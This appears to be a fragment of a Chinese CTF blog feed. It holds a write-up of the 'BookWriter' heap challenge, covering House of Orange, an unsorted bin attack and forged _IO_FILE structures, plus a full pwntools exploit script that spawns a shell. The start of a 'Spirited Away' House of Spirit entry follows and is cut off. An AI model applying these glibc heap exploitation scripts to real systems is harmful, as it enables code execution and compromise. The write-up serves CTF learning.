size更大的空间时。在<code>_int_malloc</code>检验fastbin, smallbin, unsorted bin, large bin没有找到符合需求的块时，接下俩<code>_int_malloc</code>会试图从top chunk切，如果top chunk的空间也不够，那么会执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>ptmalloc</code>已经不能满足用户申请堆内存的操作，需要执行<code>sysmalloc</code>来向系统申请更多的空间。但是对于堆来说有<code>mmap</code>和<code>brk</code>两种分配方式，我们需要让堆以<code>brk</code>的形式拓展，之后原有的top chunk会被置于unsorted bin中。<br><br>综上，我们要实现<code>brk</code>拓展top chunk，但是要实现这个目的需要绕过一些libc中的check。首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的chunk大小大于<code>mmap</code>分配阈值，默认为<code>128K</code>，并且当前进程使用<code>mmap()</code>分配的内存块小于设定的最大值，将使用<code>mmap()</code>系统调用直接向操作系统申请内存。<br><br>此外，在<code>sysmalloc</code>函数中存在对top chunk size的check，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) </span><br><span class="line">        || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE </span><br><span class="line">        &amp;&amp; prev_inuse(old_top) </span><br><span class="line">        &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里检查了top chunk的合法性：</p><ul><li>如果第一次调用本函数，top chunk可能没有初始化，所以可能<code>old_size</code>为 0。 </li><li>如果top chunk已经初始化了，那么top chunk的大小必须大于等于<code>MINSIZE</code>，因为top chunk中包含了 fencepost，所以top chunk的大小必须要大于<code>MINSIZE</code>。</li><li>其次top chunk必须标识前一个chunk处于inuse状态.</li><li>并且top chunk的结束地址必定是页对齐的。</li><li>此外top chunk除去fencepost的大小必定要小于所需chunk的大小，否则在<code>_int_malloc</code>函数中会使用top chunk分割出chunk。<br><br>因此伪造的top chunk size需要满足：</li><li>伪造的size必须要对齐到内存页(0x1000)</li><li>size要大于<code>MINSIZE(0x10)</code></li><li>size要小于之后申请的<code>chunk size + MINSIZE(0x10)</code></li><li>size的<code>prev inuse</code>位必须为 1</li></ul><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bins是一个双向链表，它采用的遍历顺序是FIFO，即插入时插在头部，取出时从尾部取。<br><br>当响应内存分配请求时，若small bin中不含符合要求的块，那么此时就会从unsorted bins中查找，如果有符合要求的，就会被取出来使用，其余的根据大小分别放在不同的bin中。<br><br>从unsorted bins中取块时，会将改该unsorted bin的bck-&gt;fd写为unsorted bins的地址（glibc2.23的版本下是<code>main_arena+0x58</code>，以后提及“unsorted bins的地址”，均用<code>main_arena+0x58</code>代替）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">    malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>于是只要伪造unsorted bin的bk的值，就能将<code>main_arena+0x58</code>写到bk的fd处。</p><p><img src="/2020/04/09/pwn-heap-BookWriter/unsorted_bin_attack_order.png" alt></p><p>事实上，一般在配合House of orange的情况下，一般会选择将<code>_IO_list_all</code>更改为<code>main_arena+0x58</code>，而此时<code>_IO_list_all-&gt;_chains</code>正好指向<code>main_arena</code>中size为0x60的smallbin。</p><h2 id="fake-IO-FILE-and-vtable"><a href="#fake-IO-FILE-and-vtable" class="headerlink" title="fake _IO_FILE and vtable"></a>fake _IO_FILE and vtable</h2><p>前面提到<code>_IO_list_all-&gt;_chains</code>正好指向<code>main_arena</code>中size为0x60的smallbin，那么只要伪造出对应的smallbin为<code>struct _IO_FILE</code>以及伪造出相应的<code>vtable</code>地址以及<code>vtable</code>内容，就可以达到getshell的目的。<br><br>因为这题是glibc2.23，所以不存在对vtable的check，所以vtable也可以随意构造。至于更高的glibc版本（如glibc2.24），存在一些相应的对vtable的检查机制，构造vtable会有困难，解决方案可以参考<a href="https://n0nop.com/2020/02/07/pwn-heap-melody-center/#利用思路" target="_blank" rel="noopener">melody_center</a>。<br><br>对于<code>_IO_FILE</code>的构造，需要满足以下条件：</p><ul><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61                     smallbin with size 0x60</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all-0x10</code>     _IO_list_all ==&gt; main_arena+0x58</li><li><code>vtable-&gt;_IO_OVERFLOW</code> = <code>system</code>             _IO_OVERFLOW(fp);</li><li><code>fp</code> start with “/bin/sh\x00”<br><br>显然对于glibc2.24中利用<code>_IO_str_jumps</code>的方法，对于glibc2.23同样适用。</li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li><code>edit</code>功能中由于会根据<code>strlen</code>重新设置可读入的长度，因此可以在长度包含next chunk的size域的时候，可以完成对next chunk的size字段的修改，这里是更改top chunk的size，使其在下一次分配更大的空间的时候，被free到unsorted bin中。</li><li>由于malloc出的chunk里的内容不会被清0，因此在从unsorted bin中分配内存时，只要将原fd字段用字符填满，即可利用<code>view</code>功能leak出bk处的<code>main_arena</code>相关地址，从而得到libc的基地址。</li><li><code>add</code>功能中对个数判断存在漏洞，即bss上的储存chunk的空间只有8个，而这里可以分配第九个也就是<code>chunk_array[8]</code>，而<code>chunk_array[8]</code>其实就是<code>chunk_size[0]</code>，只要利用<code>edit</code>功能中对size的改写将<code>chunk_size[0]</code>变为0（通过输入’\x00’开头可以做到），就可以将<code>chunk_size[0]</code>overwrite为堆地址，从而可以接受更多输入，这一点很重要，因为后面修改伪造<code>_IO_FILE</code>，<code>vtable</code>以及smallbin需要用到。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>接下来就是构造<code>_IO_FILE</code>结构体了，因为这里没有选择leak heap address，也就没有选择在堆块中伪造<code>vtable</code>，还是选择利用<code>_IO_str_jumps</code><del>其实就是偷个懒，用一下之前写过的脚本</del>。其实可以通过author name把紧跟着的<code>chunk_array[0]</code>打印出来，然后伪造<code>vtable</code>，然后利用<code>_IO_OVERFLOW(fp)</code>…</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"Author :"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of page :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index of page :"</span>, str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index of page :"</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"Content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(choice, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Do you want to change the author ? (yes:1 / no:0) "</span>, str(choice))</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Author :"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">                  p32(<span class="number">0</span>) + \</span><br><span class="line">                  p64(_IO_read_ptr) + \</span><br><span class="line">                  p64(_IO_read_end) + \</span><br><span class="line">                  p64(_IO_read_base) + \</span><br><span class="line">                  p64(_IO_write_base) + \</span><br><span class="line">                  p64(_IO_write_ptr) + \</span><br><span class="line">                  p64(_IO_write_end) + \</span><br><span class="line">                  p64(_IO_buf_base) + \</span><br><span class="line">                  p64(_IO_buf_end) + \</span><br><span class="line">                  p64(_IO_save_base) + \</span><br><span class="line">                  p64(_IO_backup_base) + \</span><br><span class="line">                  p64(_IO_save_end) + \</span><br><span class="line">                  p64(_IO_marker) + \</span><br><span class="line">                  p64(_IO_chain) + \</span><br><span class="line">                  p32(_fileno)</span><br><span class="line">      </span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_with_vtable</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin5file_size</span></span><br><span class="line">                        _IO_read_end = main_arena_addr,</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr - <span class="number">0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    payload += p64(_IO_str_jumps_addr - <span class="number">8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">_IO_list_all_offset = libc.symbols[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">_IO_str_jumps_offset = <span class="number">0x3c27a0</span></span><br><span class="line"></span><br><span class="line">set_name(<span class="string">"AAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># House of orange</span></span><br><span class="line"><span class="comment"># overwrite top chunk size</span></span><br><span class="line"><span class="comment"># make the chunk_size[0] = 0</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x00"</span> * <span class="number">0x38</span> + <span class="string">"\xc1\x0f\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free a unsorted bin</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc from unsorted bin</span></span><br><span class="line"><span class="comment"># leak main_arena address</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">"C"</span> * <span class="number">8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"C"</span> * <span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset - <span class="number">0x668</span></span><br><span class="line">_IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">_IO_str_jumps = libc_base + _IO_str_jumps_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc left 5 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">"DDDD"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite chunk_size[0] to a heap address</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"EEEE"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake _IO_FILE struct </span></span><br><span class="line"><span class="comment"># make sure chunk_size[0] = 0 again, so that we can malloc once again to trigger error</span></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x1f0</span></span><br><span class="line">payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena - <span class="number">0x610</span>, libc_system, str_bin_sh)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger error</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size of page :"</span>, str(<span class="number">0x18</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"_IO_list_all: "</span> + hex(_IO_list_all))</span><br><span class="line">success(<span class="string">"_IO_str_jumps: "</span> + hex(_IO_str_jumps))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>很奇怪，本地还是打不通，明明都断在<code>system</code>里面了，参数<code>rdi</code>也是对的，而且远程也是概率性打通。</li><li>调试的时候，leak出来的libc地址不是预期的<code>main_arena+0x58</code>的值，而是会大0x610，还没搞清楚原因。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></li><li><a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;典型的House of orange + unsorted bin attack + _IO_FILE，之前在&lt;a href=&quot;https://n0nop.com/2020/02/07/pwn-heap-melody-center/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;melody_center&lt;/a&gt;中有写过，基本是一样的，除了一些利用的细节。权当是练习了，毕竟第一次接触的时候，写起来有点吃力。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn heap: Spirited Away</title>
    <link href="https://n0nop.github.io/2020/04/08/pwn-heap-Spirited-Away/"/>
    <id>https://n0nop.github.io/2020/04/08/pwn-heap-Spirited-Away/</id>
    <published>2020-04-08T04:55:25.000Z</published>
    <updated>2020-04-08T06:00:01.891Z</updated>
    
    <content type="html"><![CDATA[<p>House of spirit attack，题目名字说明了一切。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>32位程序，基本没开啥保护。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>就一个评论功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1; <span class="comment">// [sp+10h] [bp-E8h]@2</span></span><br><span class="line">    <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+48h] [bp-B0h]@1</span></span><br><span class="line">    <span class="keyword">size_t</span> v3; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+50h] [bp-A8h]@2</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// [sp+A0h] [bp-58h]@2</span></span><br><span class="line">    <span class="keyword">void</span> *buf; <span class="comment">// [sp+A4h] [bp-54h]@2</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [sp+A8h] [bp-50h]@2</span></span><br><span class="line"></span><br><span class="line">    nbytes = <span class="number">0x3C</span>;</span><br><span class="line">    v3 = <span class="number">0x50</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v7, v3);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line">    ++cnt;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;v7);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"200 comments is enough!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;choice, <span 